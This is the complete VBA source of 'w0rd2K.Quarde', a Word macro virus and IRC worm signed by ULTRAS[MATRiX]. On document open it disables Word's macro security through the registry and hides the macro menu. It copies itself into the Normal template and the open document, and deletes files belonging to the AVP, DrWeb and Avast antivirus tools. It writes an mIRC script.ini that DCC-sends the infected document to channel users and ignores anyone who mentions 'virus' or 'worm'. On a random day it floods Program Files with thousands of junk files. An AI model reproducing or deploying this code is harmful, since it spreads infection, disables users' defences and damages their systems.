Sub Document_Open()
On Error Resume Next
'w0rd2K.Quarde
If Application.Version = "9.0" Then
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1)
Options.SaveNormalPrompt = (1 - 1)
End If
TD = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 1) <> "'w0rd2K.Quarde" Then
Set NT = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
NT.DeleteLines 1, NT.CountOfLines
NT.AddFromString TD
NT.ReplaceLine 1, "Sub Document_Close()"
NT.ReplaceLine 40, "MiRC_iNF2(disk)"
NT.ReplaceLine 44, "Function MiRC_iNF2(disk)"
End If
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) <> "'w0rd2K.Quarde" Then
Set VA = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
VA.DeleteLines 1, VA.CountOfLines
VA.AddFromString TD
VA.ReplaceLine 1, "Sub Document_Open()"
VA.ReplaceLine 40, "MiRC_iNF(disk)"
VA.ReplaceLine 44, "Function MiRC_iNF(disk)"
End If
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
avp = "C:\Program Files\AntiViral Toolkit Pro\macro.avc"
drweb = "C:\Program Files\DrWeb\*.*"
avast = "C:\Program Files\ALWIL Software\Avast32\*.*"
If Dir(avp) <> "" Then Kill (avp)
If Dir(drweb) <> "" Then Kill (drweb)
If Dir(avast) <> "" Then Kill (avast)
For i = 0 To 5
disk = Chr$(Asc("C") + i)
Call MiRC_iNF(disk)
Next
End Sub

Function MiRC_iNF(disk)
doc = "quarde.doc"
win = Environ("windir")
full = win & "\" & doc
SCP$ = disk + ":\Program Files\Mirc32\mirc32.exe "
If Dir(SCP$) <> "" Then mircdir = 1: GoTo found
SCP$ = disk + ":\Program Files\Mirc\mirc32.exe"
If Dir(SCP$) <> "" Then mircdir = 2: GoTo found
SCP$ = disk + ":\Mirc\mirc32.exe"
If Dir(SCP$) <> "" Then mircdir = 3: GoTo found
SCP$ = disk + ":\Mirc32\mirc32.exe"
If Dir(SCP$) <> "" Then mircdir = 4: GoTo found
GoTo not_found
found:
If mircdir = 1 Then Dirz$ = disk + ":\Program Files\Mirc32\"
If mircdir = 2 Then Dirz$ = disk + ":\Program Files\Mirc\"
If mircdir = 3 Then Dirz$ = disk + ":\Mirc\"
If mircdir = 4 Then Dirz$ = disk + ":\Mirc32\"
ActiveDocument.SaveAs full + ActiveDocument.FullName
Open Dirz$ + "script.ini" For Output As #1
Print #1, "[script]"
Print #1, "n0; Quarde Script"
Print #1, "n1; by ULTRAS[MATRiX]"
Print #1, "n2=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
Print #1, "n3=  /dcc send $nick " & full
Print #1, "n4=}"
Print #1, "n5="
Print #1, "n6=;ON 1:PART:#:{ /if ( $nick == $me ) { halt }"
Print #1, "n7=/dcc send $nick " & full
Print #1, "n8=}"
Print #1, "n9="
Print #1, "n10=on 1:QUIT:#:/msg $chan What`s my age again?"
Print #1, "n11=on 1:TEXT:*script.ini*:#:/.ignore $nick"
Print #1, "n12=on 1:TEXT:*script.ini*:?:/.ignore $nick"
Print #1, "n13=on 1:TEXT:*virus*:#:/.ignore $nick"
Print #1, "n14=on 1:TEXT:*virus*:?:/.ignore $nick"
Print #1, "n15=on 1:TEXT:*worm*:#:/.ignore $nick"
Print #1, "n17=on 1:TEXT:*worm*:?:/.ignore $nick"
Print #1, "n16=on 1:TEXT:*quarde*:#:/.ignore $nick"
Print #1, "n17=on 1:TEXT:*quarde*:?:/.ignore $nick"
Print #1, "n18=on 1:TEXT:*doc*:#:/.ignore $nick"
Print #1, "n19=on 1:TEXT:*doc*:?:/.ignore $nick"
Close #1
ActiveDocument.Save
not_found:
If Day(Now()) = Int(Rnd() * 30 + 1) Then
For live = 1 To 9999
shit = Int(Rnd() * 9999999 + 1)
Open "C:\Program Files\" & shit For Output As #2
Print #2, "[Quarde by ULTRAS/MATRiX]"
Close #2
Next live
End If
End Function





